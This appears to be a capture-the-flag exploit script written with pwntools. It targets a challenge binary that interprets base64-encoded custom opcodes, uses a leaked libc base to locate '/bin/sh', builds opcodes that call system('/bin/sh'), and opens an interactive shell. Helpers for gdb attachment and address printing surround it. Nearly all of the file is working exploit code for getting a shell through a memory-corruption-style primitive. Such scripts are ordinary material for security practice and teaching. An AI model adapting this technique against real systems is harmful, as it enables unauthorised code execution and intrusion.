#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))

def Opcode(op,v1,v2):
    return p64(op)+p64(v1)+p64(v2)

def PushData(value):
    return Opcode(0x10,0,value)

def RunFunction(fname):
    return p64(0x40)+fname.ljust(8,'\x00')+p64(0)

def Run(code):
    a.sendafter("code:",base64.b64encode(code))

a.recvuntil("gift:")
libc_base=eval(a.recvuntil("\n",drop=True))
bin_sh_addr = libc_base+next(libc.search("/bin/sh"))
code = PushData(bin_sh_addr)
code += RunFunction("system")
Run(code)
a.interactive()



